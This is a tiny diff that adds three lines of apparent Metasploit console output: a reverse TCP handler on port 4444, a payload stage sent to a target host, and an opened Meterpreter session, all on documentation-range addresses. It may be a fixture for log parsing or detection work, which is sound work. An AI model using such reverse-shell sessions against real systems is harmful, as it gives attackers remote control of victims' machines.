@@ -1,0 +1,4 @@
+[*] Started reverse TCP handler on 192.0.2.20:4444
+[*] Sending stage (203846 bytes) to 192.0.2.10
+[*] Meterpreter session 3 opened (192.0.2.20:4444 -> 192.0.2.10:49158)
+
